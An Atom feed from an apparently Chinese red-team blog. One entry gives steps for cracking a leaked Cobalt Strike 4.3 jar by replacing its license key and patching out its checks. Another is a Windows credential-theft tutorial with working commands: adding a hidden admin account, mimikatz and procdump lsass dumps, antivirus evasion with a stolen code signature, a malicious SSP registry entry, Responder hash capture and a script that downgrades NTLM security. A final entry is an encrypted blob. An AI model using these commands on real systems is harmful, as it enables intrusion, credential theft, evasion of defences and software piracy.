<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>written by hosch3n</subtitle>
  <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://hosch3n.github.io/"/>
  <updated>2021-06-13T02:21:52.794Z</updated>
  <id>https://hosch3n.github.io/</id>
  
  <author>
    <name>hosch3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS43伪破解与二次开发</title>
    <link href="https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <id>https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</id>
    <published>2021-05-29T12:57:09.000Z</published>
    <updated>2021-06-13T02:21:52.794Z</updated>
    
    <content type="html"><![CDATA[<p>cobaltstrike.auth是被RSA私钥签名（加密）的授权文件，客户端加载时会利用内置的RSA公钥对其解密，解析获取到试用水印、授权版本、有效期、AES密钥、HMAC等内容。关键的AES密钥和HMAC256用于连接服务器时，解密和校验sleeve中的动态链接库。</p><h2 id="LV0"><a href="#LV0" class="headerlink" title="LV0"></a>LV0</h2><p>破解cobaltstrike 4.x的前提是要么得到了泄漏的auth文件（或里面的关键key），要么得到了解密后的sleeve中的动态链接库。</p><h2 id="LV1"><a href="#LV1" class="headerlink" title="LV1"></a>LV1</h2><p>当得到了<a href="https://www.upload.ee/files/13104600/cobaltstrike.jar.html">原版Jar包</a>、重新签发的<a href="https://hosch3n.github.io/files/cobaltstrike.auth">auth文件</a>和对应的<a href="https://hosch3n.github.io/files/authkey.pub">公钥</a>时，只需替换官方内置的公钥即可。具体操作如下：</p><p>I. 反编译原版Jar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用IDEA目录中的 plugins/java-decompiler/lib/java-decompiler.jar 反编译源码至ex目录中</span></span><br><span class="line">java -cp ./java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> ./cobaltstrike.jar ./ex</span><br></pre></td></tr></table></figure><p>II. 新建项目并将原版Jar包作为依赖加载，配置好Artifacts</p><p><img src="/img/cswpjyek_a.png"></p><p>III. 解压反编译后的jar包，替换resources/authkey.pub，修改common/AuthCrypto中的md5校验为公钥对应的哈希<code>5e5c629ad2673a45b4d3c69984dbdf36</code></p><p>IV. 将beacon/BeaconData中49行的<code>this.shouldPad</code>修改为false，去除exit</p><h2 id="LV2"><a href="#LV2" class="headerlink" title="LV2"></a>LV2</h2><p>基于原版Jar包和关键key，根据逆向的代码逻辑倒推出auth文件内容，自己生成RSA密钥对并签发auth文件。</p><p>由common/Authorization可以看出，auth文件中存放的字节数组依次为4位文件头、2位文件长度、4位有效期、4位水印、1位有效版本、3x(1+16)位未起作用的数据（1位用于标识长度，猜测是官方用于定位原auth文件的购买者身份？）、1位标识关键key长度、关键key。</p><p><img src="/img/cswpjyek_b.png"></p><h2 id="LV3"><a href="#LV3" class="headerlink" title="LV3"></a>LV3</h2><p>利用关键key解密sleeve中的动态链接库，修改common/SleevedResource中的解密逻辑为直接返回原资源。</p><p>修改beacon/BeaconPayload中的抑或key，同时通过机器码特征定位修改dll中的抑或key。废除cloudstrike/WebServer中checksum8上线机制。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://raidforums.com/Thread-Cobalt-Strike-4-3-March-17-2021-bug-fixes?page=4">Cobalt Strike 4.3 (March 17, 2021) [bug fixes]</a></p><p><a href="https://verify.cobaltstrike.com/">官网SHA256哈希校验</a></p><p><a href="https://rcoil.me/2020/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Cobalt%20Strike%204.0%E8%AE%A4%E8%AF%81%E5%8F%8A%E4%BF%AE%E8%A1%A5%E8%BF%87%E7%A8%8B/">【知识回顾】Cobalt Strike 4.0 认证及修补过程</a></p><p><a href="https://www.bilibili.com/video/BV1yz411i71Z?p=10">RedCore红队学院CSTips</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cobaltstrike.auth是被RSA私钥签名（加密）的授权文件，客户端加载时会利用内置的RSA公钥对其解密，解析获取到试用水印、授权版本、有效期、AES密钥、HMAC等内容。关键的AES密钥和HMAC256用于连接服务器时，解密和校验sleeve中的动态链接库。&lt;/</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="idea" scheme="https://hosch3n.github.io/tags/idea/"/>
    
    <category term="jar" scheme="https://hosch3n.github.io/tags/jar/"/>
    
    <category term="rsa" scheme="https://hosch3n.github.io/tags/rsa/"/>
    
    <category term="aes" scheme="https://hosch3n.github.io/tags/aes/"/>
    
    <category term="hmac" scheme="https://hosch3n.github.io/tags/hmac/"/>
    
  </entry>
  
  <entry>
    <title>Windows凭据窃取（一）</title>
    <link href="https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-03-10T15:48:05.000Z</published>
    <updated>2021-03-13T15:04:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的</em> </p><h2 id="Mimikatz非交互执行"><a href="#Mimikatz非交互执行" class="headerlink" title="Mimikatz非交互执行"></a>Mimikatz非交互执行</h2><p>在很久很久以前，通过<code>高卢神器Mimikatz</code>扒Windows的系统密码，就已经是横向移动的标配手段之一。那时候，运维对 AV / EDR / IDS / IPS 还没什么概念，更不用提威胁情报、欺骗防御了。于是只要找个论坛下载原封不动编译好的猕猴桃，远程桌面连上去就能扒下更多的账户密码。</p><p>可能有同学要怼我了，你密码都不知道怎么连远程桌面扒密码？前辈们其实也遇到了这个问题，所以除了RDP密码泄漏这种途径，常常会先添加一个伪装成机器用户的管理员：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: 添加用户</span><br><span class="line"><span class="built_in">net</span> user system$ Passw0rd! /add</span><br><span class="line">:: 加入管理员组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators system$ /add</span><br><span class="line">:: 开启远程登录</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line">:: 查询端口</span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure><p>又或者通过WebShell非交互式地将输出重定向到文件：</p><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; hash.txt</code></p><p>这引起了某些反病毒软件（AV）的注意，它们将<code>“mimikatz”</code>加入了特征库，也有的会拦截WebShell加系统用户的行为。这时常用的绕过技术有了两条分支，一种是对mimikatz做免杀，另一种是dump存在密钥的lsass进程。</p><h2 id="免杀Mimikatz"><a href="#免杀Mimikatz" class="headerlink" title="免杀Mimikatz"></a>免杀Mimikatz</h2><p>先聊聊对Mimikatz做免杀，反病毒软件两大主要的着力点应该就是对静态特征和动态行为的查杀了，绕过静态特征查杀的基础就是修改特征码。AV厂商（<em>怎么怪怪的</em>）自然会选取正常软件几乎没有，而恶意软件特有的东西作为特征来规避误报。无论是WebShell脚本还是恶意软件的免杀，就是伪装成正常文件逃避检测，因此定个小目标，伪装成<code>SysinternalsSuite</code>的<code>PsExec64.exe</code>。</p><p>浏览一遍源码，感觉可能被用作特征码的字段有这些：</p><p><img src="/img/winkeyqqa_a.png"></p><p>批量将其改为psexec、pslib等，并修复头文件引用。</p><p>项目中的<code>*.rc</code>文件标识着程序元信息：</p><p><img src="/img/winkeyqqa_b.png"></p><p>查看PsExec64.exe的元信息会因为窗口大小被遮挡一部分（无法调整窗口大小），一些括号等特殊符号肉眼也无法区分是半角还是全角、周围有没有空格，手敲模仿不但累还容易敲错。</p><p><img src="/img/winkeyqqa_c.png"></p><p>可以利用<a href="https://github.com/Dijji/FileMeta">FileMeta</a>项目将exe文件元信息设置为可编辑，复制后替换Mimikatz的元信息。</p><p><img src="/img/winkeyqqa_d.png"></p><p>mimilib子项目加载Dll后会生成log记录文件：</p><p><img src="/img/winkeyqqa_e.png"></p><p>通常会将mimilib.dll放在system32路径下，出现log文件显然不正常，同时注意到文件写入均为追加模式，我们将这些<code>*.log</code>文件批量替换为<code>msgsm64.acm</code>用于伪装。</p><p>编译完成后利用<a href="https://github.com/secretsquirrel/SigThief">SigThief</a>项目给生成的exe和dll加上<code>PsExec64.exe</code>的证书，强行偷来的证书校验自然是对不上的，目前某些杀软可能是出于 性能 / 误报 考虑，似乎并未对白签名证书程序进行校验。</p><p><img src="/img/winkeyqqa_f.png"></p><p>也可通过PowerSploit的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1">Out-EncryptedScript</a>脚本，生成加密的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>绕过AV。</p><ul><li>绕过行为特征查杀目前已有多种内存申请、进程注入、规避敏感接口等等方法，但这不是本文的重点之后有缘再聊。</li></ul><h2 id="进程dump"><a href="#进程dump" class="headerlink" title="进程dump"></a>进程dump</h2><p>静态免杀能过动态行为不一定能过，上面纯属耍小聪明运气好罢了，Mimikatz本身调用了大量WinAPI，改起来有亿点门槛。在网络环境好的情况下，可以dump出lsass进程并将内存dump文件下载回本地读取：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>起初可以用各种工具Dump lsass进程，后来一般只有<code>SysinternalsSuite</code>的<code>procdump</code>才不会告警了。</p><ul><li>GUI环境下也可以利用任务管理器等程序</li></ul><h2 id="AddSecurityPackage"><a href="#AddSecurityPackage" class="headerlink" title="AddSecurityPackage"></a>AddSecurityPackage</h2><p>虽然部分杀软对procdump不告警，但在网络环境恶劣的内网还是相当不友好，再如果碰上有卡巴斯基的机器更是直接嗝屁：</p><p><img src="/img/winkeyqqa_g.png"></p><p>至此我们需要了解一个叫SSP（Security Support Provider）的东西，它是SSPI（Security Support Provider Interface）这个Windows认证API的具体dll实现，通过<code>EnumerateSecurityPackages</code>接口可以枚举出已加载的SSP。mimilib.dll就具备SSP的功能，需要在注册表中添加Dll路径并调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-addsecuritypackagea">AddSecurityPackage API</a>加载SSP（或者重启）：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d &quot;pslib64.dll&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/img/winkeyqqa_h.png"></p><ul><li>放在System32目录的pslib64.dll为免杀的mimilib.dll，图中伪装为<code>DPA SSP</code></li></ul><p>发生锁屏登录或是runas等认证行为后，会将明文密码记录在System32下的<code>msgsm64.acm</code>中（默认在kiwissp.log）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[00000000:000003e7] [00000002] WORKGROUP\WIN2019$ (WIN2019$)</span><br><span class="line">[00000000:0000b1bd] [00000002] WORKGROUP\WIN2019$ (UMFD-0)</span><br><span class="line">[00000000:0000b1dd] [00000002] WORKGROUP\WIN2019$ (UMFD-1)</span><br><span class="line">[00000000:000003e4] [00000005] WORKGROUP\WIN2019$ (NETWORK SERVICE)</span><br><span class="line">[00000000:000108e8] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:00010927] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:000003e5] [00000005] \ (LOCAL SERVICE)</span><br><span class="line">[00000000:000205d2] [00000002] WIN2019\ryan (ryan)toor</span><br><span class="line">[00000000:0002064b] [00000002] WIN2019\ryan (ryan)toor</span><br></pre></td></tr></table></figure><p>这样做好处就是能扒到明文密码、会进行持久化更新和记录，坏处就是Dll要免杀、有时候也并不一定要持久化或是拿到明文密码才行，并且需要修改注册表、调用<code>AddSecurityPackage API</code>、可被<code>EnumerateSecurityPackages API</code>枚举查看、还要等一个有缘人触发登录行为。</p><p>很多时候会有点得不偿失，于是XPN在对<code>Mimikatz</code>和<code>Secur32.dll</code>跟进深入分析后，发现了以下几个要点：</p><ol><li><p>WDigest会调用SpAcceptCredentials缓存凭据</p></li><li><p>Mimilib在明文凭据传入调用后将其保存到文件里</p></li><li><p>MemSSP搜索lsass进程中的<code>msv1_0.dll</code>，通过<code>WriteProcessMemory</code> Hook <code>SpAcceptCredentials</code></p></li><li><p><code>AddSecurityPackage API</code>会通过<code>SspirCallRpc</code>调用<code>lsass</code>，通知<code>lsass</code>加载SSP</p></li></ol><p>在<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">Github Gist</a>有不使用<code>AddSecurityPackage API</code>加载Dll的代码，咱们对其稍作修改：</p><ol><li><p>引入静态链接库<code>#pragma comment(lib, &quot;Rpcrt4.lib&quot;)</code></p></li><li><p>修改工程字符集为<code>Use Multi-Byte Character Set</code></p></li></ol><p><img src="/img/winkeyqqa_i.png"></p><ol start="3"><li>为了用起来方便，将原本的绝对路径加载Dll改为相对相对路径加载（可以用判断目录等方式实现兼容绝对路径和相对路径，但懒得搞感觉不是很必要）</li></ol><p><img src="/img/winkeyqqa_j.png"></p><ol start="4"><li>最后整一个查找lsass进程并Dump内存的Dll：</li></ol><p><img src="/img/winkeyqqa_l.png"></p><ol start="5"><li>利用RPC调用lsass加载Dll并Dump自身内存：</li></ol><p><img src="/img/winkeyqqa_m.png"></p><p>好处是无需修改注册表、枚举SSP查不到，坏处是网络环境恶劣时不方便将Dump文件下载回来，所以也可以考虑用XPN公布的<a href="https://gist.github.com/xpn/93f2b75bf086baf2c388b2ddd50fb5d0">memssp版Dll</a>。</p><h2 id="Net-NTLMv1"><a href="#Net-NTLMv1" class="headerlink" title="Net-NTLMv1"></a>Net-NTLMv1</h2><p>为了缓解内存中WDigest的明文密码泄漏，微软发布了KB2871997（当然这个补丁作用不止于此），会在登录后将明文缓存清除掉，并且限制本地Administrator（RID 500）和本地管理员组的域用户之外的用户进行PTH（比如本地管理员组的其它用户不行）。</p><p>PassTheHash（PTH）通常是指利用NTLM哈希完成Windows身份认证这一类行为，具体可通过<code>mimikatz</code>、<code>psexec</code>、<code>smbexec</code>、<code>atexec</code>、<code>wmiexec</code>、<code>dcomexec</code>、<code>WinRM</code>等等实现。但我们不妨思考一下，为什么可以不需要明文密码？</p><p>Web应用通常是服务端收到HTTP/S传输来的明文密码（当然也有会前端加密的），在<strong>服务端</strong>对明文密码哈希计算并与数据库中存储的密码哈希比对，所以得到密码哈希后，需要由彩虹表查出明文密码才能登录。但NTLM身份认证是由<strong>客户端</strong>将用户输入的明文密码转化为NTLM哈希并加密为Net-NTLM后再由SMB、HTTP等协议传输，这就是为什么很多时候并不需要明文密码。</p><p>LM哈希（LAN Manager Hash）是NT5系列操作系统的密码默认加密方式，将明文规则变换后进行DES加密。实现方式使其可加密的最大长度为14、无法区分大小写、密文强度不高。</p><p><img src="/img/winkeyqqa_n.png"></p><p>随后微软设计了基于challenge/response机制的NTLM（NT LAN Manage)身份验证协议，从NT6操作系统开始将NTLM Hash作为密码默认加密方式。</p><p><img src="/img/winkeyqqa_o.png"></p><ol><li><p>在进行身份认证的过程中，客户端会以NTLM哈希作为密钥，通过3DES（NTLMv1）/ HMAC-MD5（NTLMv2）算法加密服务端发来的challenge，进行规则变换后最终得到net-ntlm哈希。</p></li><li><p>服务端取出密码库里存的NTLM哈希，以同样的算法加密challenge，比对客户端发来的net-ntlm哈希判断密码是否正确。</p></li><li><p>如果是域环境则密码库可能不在同一个服务端（在域控上），此时服务端会由Pass Through Authentication机制，通过netlogon协议向域控转发客户端信息。</p></li></ol><p><img src="/img/winkeyqqa_p.png"></p><p>其中NTLMv1根据有无<code>Client Challenge</code>参与，可分为第一种Net-NTLMv1哈希和另一种Net-NTLMv1-SSP哈希。而第一种Net-NTLMv1哈希因实现方式的问题，导致可以设置一个固定的<code>Sever Challenge</code>（1122334455667788）建立<a href="https://github.com/lgandx/Responder">Rogue Server</a>，在目标系统向我们建立的恶意服务器发起SMB请求（最简单的就是访问一个UNC路径<code>\\1.1.1.1</code>），通过<a href="https://crack.sh/get-cracking/">彩虹表</a>可查到解密后的NTLM哈希。</p><p><code>sudo ./Responder.py -I wlp2s0 -wrfv --lm</code></p><p><img src="/img/winkeyqqa_q.png"></p><p>这样就可不对Lsass进程毛手毛脚就获取到NTLM哈希，当然也可以尝试更进一步通过彩虹表查出NTLM哈希对应的明文密码。</p><p><img src="/img/winkeyqqa_k.png"></p><p>不过实际利用中可能会出现这种情况：</p><p><img src="/img/winkeyqqa_r.png"></p><p>这是因为<a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows">高版本</a>的Windows服务器上可能不存在SMBv1客户端，其次LMCompatibilityLevel的值也会有影响。可以利用PowerShell修改注册表并安装SMBv1客户端，<strong>注意会导致系统重启！</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set-Relay</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># LMCompatibilityLevel</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span> /v lmcompatibilitylevel /t REG_DWORD /d <span class="number">2</span> /f</span><br><span class="line"><span class="comment"># NTLMMinClientSec</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v NtlmMinClientSec /t REG_DWORD /d <span class="number">536870912</span> /f</span><br><span class="line"><span class="comment"># RestrictSendingNTLMTraffic</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v RestrictSendingNTLMTraffic /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable SMBv1</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> smb1protocol</span><br><span class="line"><span class="comment"># DisableLoopbackCheck</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\&quot;</span> /v LsaDisableLoopbackCheck /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Relay</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">Exploring Mimikatz - Part 2 - SSP</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/">Mimikatz中SSP的使用</a></p><p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#44-%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E7%9A%84%E5%AF%B9%E6%8A%97">这是一篇“不一样”的真实渗透测试案例分析文章</a></p><p><a href="https://mp.weixin.qq.com/s/K-gA9UOyjT7y51ZqmHGnNw">dump lass 工具</a></p><p><a href="https://www.mrwu.red/web/2000.html">通过Windows蓝屏文件来绕过kaspersky的内存保护抓密码</a></p><p><a href="https://www.sans.org/blog/protecting-privileged-domain-accounts-network-authentication-in-depth/">Protecting Privileged Domain Accounts: Network Authentication In-Depth</a></p><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#1-netntlm-v1-de-po-jie">Net-NTLM v1 的破解</a></p><p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">Network security: LAN Manager authentication level</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的&lt;/em&gt; &lt;/p&gt;
&lt;h2 id=&quot;Mimikatz非交互执行&quot;&gt;&lt;a href=&quot;#Mimikatz非交互执行&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="mimikatz" scheme="https://hosch3n.github.io/tags/mimikatz/"/>
    
    <category term="mimilib" scheme="https://hosch3n.github.io/tags/mimilib/"/>
    
    <category term="ssp" scheme="https://hosch3n.github.io/tags/ssp/"/>
    
    <category term="ntlm" scheme="https://hosch3n.github.io/tags/ntlm/"/>
    
  </entry>
  
  <entry>
    <title>Windows权限维持</title>
    <link href="https://hosch3n.github.io/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://hosch3n.github.io/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2021-01-11T06:28:29.000Z</published>
    <updated>2021-03-09T09:56:38.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="04cf9c152e89284c9c1c52203553e6284875727844ff7a51f0ac442a4fecf7fe">41c58eb45cf8d2595182cf24053a0074c59741e7a139e91c827700b7dfdb2e3353befd1b1d348732bdf792d0b3f74406925160ad6843402be69f2f95967eef44fe7ed012fe2f2a615f28eb6e862822f1cec8568c9f0270aa460e70173cd732428941f32a1c10160a9d0a0cc947d75da8496aeaba5b06f8b55adc7f2545174aa19b1de337ce414cc332725970b200642edddf25b2e7f71c336456f5efb3cea3299b202f3dc4633edffbbdc471426b9499089f51a382c849d5a3e2363128362cd6b8fa7e2c68117857106cc499604bc3a7dca4f6f2d0d9c574d9d1951bec6c640e30aff7e3fc5e308811323a64b50561a7f7b04d41b2adf501ae805f6feb72072566fd5dfdb075e8a2b7b45f0af9e5a08037cc1967e968ebcc6859e4dae721184fc6e24e10c3b60a407d5190b2d6de83bd547480d124644015994b78945292c4fdf97df5b7932fe70a086e5cd333420f35cd127b0656605f6a83caf980dc4f5999af1d0dcbc0ac2e66a9f2a108184adc3838a6e86298341634f5276b24acaa9fb67dfe6e8fff4c237a5ecaadf28d7600b727397b60cbc3bb3529e90e5e84996fdbb4edff170b226130f69e879c152d1821252f7cf99aa709ae66e5904cd948ecada020f12c46129b65e887de21bbea660df76c60cef487768d761d64b1421a8228c66ee9854da607d9f10ebe53dedb958a55c2c9adad278e77d78dfdcd5628aa5ad32de59be3ef4268ea75c3e4c30819c9d2b2f9a6751d9766b5ae3bdd9c80d75e8e624b96036a92458b58d284752b47271ff2b7b8f9dea7274306586ce98e1c3a03cd61991ac4eae4ebdb935a59d3f2f0774be5d8f68d41abb07f0340f47a683b568ff284ebd2f0bd3a57c3882d9e4e80304e852bff7dc663c5d232e17e238d82e36c06d1c8b910b528da80945ce133415f41c94fd8373d5f13522f01af6e2ea39cea0943d0e38625eb1dccebae1fb4bce4b758f4bf72d736b5369c953d599853dbad21d0430fde9d487706e2daf372b201656cc37a9db296824e5f9c44fbb4ebd42e2be02a0acc5aa886981d79fa6e37690ee93496300d5c417c99e9d9ff316290039baa9307c320f498018c21a1922fb2f5a003f020cb985ddeb378837ac8be2300791ac459b098373d7a5cc3ef572a14d16d285d95c63ee315448e9c4ba50835ce02fbbd6456cffaa07979d832168fe12af1001866536f9b54fef464d88659c7f6c8b620b092ec1652667e7430641e759616d1092c6ebe809c08778d11699a1e84c1539acb245c9da4a7a06184d82264f27b426e3f696603de412410d9d8f951ccfcd41e62d87baf870efa783dff07a7d930cd5b714f442b51ed3ad851fe277733cf6c433aaec2a41a583ca36ee72aadd67683cfc0755764b625a69d6547c8d7e91857e94658bba24592595d8f606c310f2a49c808b8d38bcc08e450cd227100bc535ec9c1b357c9d910c85b863aeb05df181c4b7ad0b79a9d759486e49409bcf7910cc07e823e65f842a479d541f1e8b8a62a0db9c68963fe2e86c4d677823913056569cacfc65a9b6d9d966076806f55d84e1efbdce5324cdb556f34b97e6934bad0a090db7bcfb78c151b288411582e3e05dafb29c80a7026771fbb1c7c5fd81e0886e7aff20b26156bd9fcbf1673725ffe5bb9d7aacfd1db28155237213e48cda0cf3e1beb12a7ff2bf965122c7a25ac1dbb59e595d50a0918c5911edcfac37ee61becb0ab60d3f54474e027c0269bb8ad27817a6df69eebac96cc5a82956b5b7578c6891b9875b0df447daf017995cf63f61099aeb39c3e04614c91dd174efca52cfb4a8f1397da9d957b3c012ead19e85556178980b86b9012ed42e5fa91fcf4a91489464c9578ffdc860192bfa8719615207e08346aaa838f576edc5cc503254dd8c58a9881b30eff6bb7f61801443e4eb1ce8ede315e0c8df61f9979277ce9a587eee713c92238898526f718f4484ea0139143920d9ca03c3d32c35aed0de06272560b298ea271cab71b35cb01f7a9d6f02af5bb56d32e9d4d222b2b2273605b4fa1102db2bc895ae485a464281c2b4d1ca1e19098aba27ec692b8790287e9c6457e28e16ee790997255c43d7b8467be9eff04dafba5e4fe8fb80a159c53d90b8eec44c4bfaf81790c625e4faf763419690113ae379e7615c8b9b2044f5402ec45df1cd61a19ce53436c4adace8a0f7aa1e1551221affcfcc29fb8ca99141a827663a46caf9edbe14001a748c33e6b4e5b29cd9baf9fccc1bf832c58803d74b10f5cc6b542b5eb71f28d10b0f9b7335dbb7665f2ce9a5ed5fafab1e27dae3356478a12f7f63a0ace7ad8f8c3fbaa23e639767a264eec4baad845e98d1dd97dc4229f906c616c0b53bc17eccc668a147e00f639e8e80a6f8d6d324a4df859611f41dda5146321fbb7328f74e96af1431c0c419ee0bd986289b8847186dbe4a8dcc04958f2063cfc0160d9dd81f1affa2fcc2dd68de67ae32eeff676b93d7e54d26ea847291f3adc9c27494cf55ee5f2176cab654834bbbb50427a9817f00276bc2cfac915b3d446fcc5d3072af1897a9a6b40fba47baf4aafe37d75fc0d667637dfd4284130af9fafe9cbb39220ba919f92936fcc9c6913e610d8b61bd47438251616312dfb1b1788d9cfc0672fe412e89ee992d468e5a284f30747e1f9c807762db1430872de0b7f7ac54d5be03743bb090896caae631d71df2ac9cd5edb399873b1f465823b5498eb1f6094091050e316761f07447afc9505d3038f81389260706e78900aadca441730a789fc7cad301edf0e34a279a7e2cb62811aac96196cbeb05ac6045820a12227affcedfd80b81f4febb24219420daeae75c5b2ac7fbadf6d5f49d3e615053279a34589413196b125c0f1c8a7b0941eafc492ad4739aaf00877571b73ef633f6d1eaa622b690c7447df475f4f948bc2dc24892d9c1ca28a32de8e67787b9fd3d8e20347c54f11b51db3134073433ff84898a00e7312a62a8c07bd7652d2a6a2b0955fd0ea558cdb4e5eeaefa9c3b9b4296a13fdcbc2f8138559fe50e8aaf68132c1a49083c3bf1d5ed79251da84a2f68f473d9cba3139e182c78a90b8861ebbcb84557729bb118a474976c576e2b63c424bfb0f6096698bf35c54196f20d4017537784d1eba7cf92b3a7041bb0941ce7b8f7ae69b13daf7708ce1d7820a56b6349ff7781939bd696e7956f9c02d9740befcb6f027c91162f353b199e177f1e49a8bfe8f49f5f9780f014bb7c6132623df38fc628318deb568b91696e7e1e33cae1a65e15cd17854bb541f5a1f8eecf0f733b4903afd622c4aca2147ebfb8d932db33c5e966d9212b1f4cc590ceefa4652720086953abbf4f8d539ac09cfe86e6dd21b405e174f0113a05401bbe0b3d73fdd